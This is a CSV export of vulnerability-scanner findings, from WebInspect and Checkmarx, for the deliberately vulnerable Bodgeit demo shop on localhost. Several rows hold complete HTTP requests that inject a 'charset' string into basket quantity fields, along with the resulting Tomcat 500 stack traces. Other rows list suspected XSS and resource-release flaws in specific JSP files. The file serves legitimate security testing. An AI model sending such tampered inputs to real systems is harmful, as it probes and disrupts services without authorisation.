ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""49""; smi=""0""; sc=""1""; ID=""3ab4771d-e2bf-4dfe-b097-d78b3d0f3356""; X-Request-Memo: ID=""863d473f-8c02-4bf9-bc9b-c49f9f37917b""; sc=""1""; ThreadId=""66""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=95425C707A42EAA4BE0BC4F23058CD56;b_id=9 quantity_7=211&quantity_26=211&quantity_18=1%3b%20charset%3dutf-8&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2700 Date: Thu, 15 Oct 2015 19:14:38 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot;</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot;</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","21","Setting Manipulation: Character Set","","Low","Open","2015-10-15","WebInspect","116","Improper Encoding or Escaping of Output","","/bodgeit/basket.jsp","quantity_20","","http://localhost:8080/bodgeit/basket.jsp","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 115 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""EE710C8D08C10673D7F08A3B5764EA9F""; PSID=""AEB77DB9767A0403D3B9B98F348DFFAA""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity_20""; AttackParamIndex=""3""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""33""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""45""; smi=""0""; sc=""1""; ID=""2e1538e0-47d4-402f-8902-ad32f1fbf958""; X-Request-Memo: ID=""ec339eeb-3411-4d2a-a07e-45fca3771558""; sc=""1""; ThreadId=""64""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=E254E24D093A8E563F9625C90BEA931E;b_id=4 quantity_7=1&quantity_26=211&quantity_18=11&quantity_20=1%3b%20charset%3dutf-8&quantity_12=1&update=Update%20Basket","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 115 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""EE710C8D08C10673D7F08A3B5764EA9F""; PSID=""AEB77DB9767A0403D3B9B98F348DFFAA""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity_20""; AttackParamIndex=""3""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""33""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""45""; smi=""0""; sc=""1""; ID=""2e1538e0-47d4-402f-8902-ad32f1fbf958""; X-Request-Memo: ID=""ec339eeb-3411-4d2a-a07e-45fca3771558""; sc=""1""; ThreadId=""64""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=E254E24D093A8E563F9625C90BEA931E;b_id=4 quantity_7=1&quantity_26=211&quantity_18=11&quantity_20=1%3b%20charset%3dutf-8&quantity_12=1&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2700 Date: Thu, 15 Oct 2015 19:14:46 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot;</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot;</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","7","Setting Manipulation: Character Set","","Low","Open","2015-10-15","WebInspect","116","Improper Encoding or Escaping of Output","","/bodgeit/basket.jsp","quantity_26","","http://localhost:8080/bodgeit/basket.jsp","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 70 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""55A4A035AED67CFFFC897F95AC4A66CA""; PSID=""2F08C26924C0F48A1DBFF17176C6A53E""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity_26""; AttackParamIndex=""1""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""32""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""41""; smi=""0""; sc=""1""; ID=""fb8eb5b1-a0c3-4311-bb14-27cfacbbf925""; X-Request-Memo: ID=""f2c56487-180e-4961-943a-ef6daf3f211b""; sc=""1""; ThreadId=""62""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=EACA26D061A6BEA0F2C2A347DC85CCA6;b_id="""" quantity_7=1&quantity_26=1%3b%20charset%3dutf-8&update=Update%20Basket","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 70 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""55A4A035AED67CFFFC897F95AC4A66CA""; PSID=""2F08C26924C0F48A1DBFF17176C6A53E""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity_26""; AttackParamIndex=""1""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""32""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""41""; smi=""0""; sc=""1""; ID=""fb8eb5b1-a0c3-4311-bb14-27cfacbbf925""; X-Request-Memo: ID=""f2c56487-180e-4961-943a-ef6daf3f211b""; sc=""1""; ThreadId=""62""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=EACA26D061A6BEA0F2C2A347DC85CCA6;b_id="""" quantity_7=1&quantity_26=1%3b%20charset%3dutf-8&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2700 Date: Thu, 15 Oct 2015 19:14:23 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot;</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot;</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","16","Setting Manipulation: Character Set","","Low","Open","2015-10-15","WebInspect","116","Improper Encoding or Escaping of Output","","/bodgeit/basket.jsp","quantity_7","","http://localhost:8080/bodgeit/basket.jsp","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 56 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""89CC6A969A1EE9B1FD66947D0132EBFA""; PSID=""EEC55985FEBA55E64AEA57A3FEF1E558""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity_7""; AttackParamIndex=""0""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""35""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""41""; smi=""0""; sc=""1""; ID=""3f7164e4-a731-4ec4-a83c-130879725532""; X-Request-Memo: ID=""5ec8e6f1-c54a-483f-9213-1449acf6806c""; sc=""1""; ThreadId=""62""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=EACA26D061A6BEA0F2C2A347DC85CCA6;b_id="""" quantity_7=1%3b%20charset%3dutf-8&update=Update%20Basket","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 56 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""89CC6A969A1EE9B1FD66947D0132EBFA""; PSID=""EEC55985FEBA55E64AEA57A3FEF1E558""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity_7""; AttackParamIndex=""0""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""35""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""41""; smi=""0""; sc=""1""; ID=""3f7164e4-a731-4ec4-a83c-130879725532""; X-Request-Memo: ID=""5ec8e6f1-c54a-483f-9213-1449acf6806c""; sc=""1""; ThreadId=""62""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=EACA26D061A6BEA0F2C2A347DC85CCA6;b_id="""" quantity_7=1%3b%20charset%3dutf-8&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2700 Date: Thu, 15 Oct 2015 19:14:16 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot;</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot;</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","629","Suspected_XSS","","Low","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","283","Suspected_XSS","","Low","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/header.jsp","","","http://localhost/bodgeit/root/header.jsp","","","","","","","",""
"DemoApps","","Bodgeit","331","Suspected_XSS","","Low","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/header.jsp","","","http://localhost/bodgeit/root/header.jsp","","","","","","","",""
"DemoApps","","Bodgeit","579","Suspected_XSS","","Low","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/password.jsp","","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","313","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","352","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","390","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","420","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","440","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","509","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","526","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","385","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/advanced.jsp","","","http://localhost/bodgeit/root/advanced.jsp","","","","","","","",""
"DemoApps","","Bodgeit","435","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/advanced.jsp","","","http://localhost/bodgeit/root/advanced.jsp","","","","","","","",""
"DemoApps","","Bodgeit","552","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/advanced.jsp","","","http://localhost/bodgeit/root/advanced.jsp","","","","","","","",""
"DemoApps","","Bodgeit","270","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","281","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","332","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","355","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","381","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","389","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","395","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","410","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","412","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","418","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","421","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","430","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","437","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","470","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","502","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","511","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","514","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","528","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","535","Improper_Resource_Shutdown_or_Release","","Low","Open","2015-10-15","Checkmarx","404","Improper Resource Shutdown or Release","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
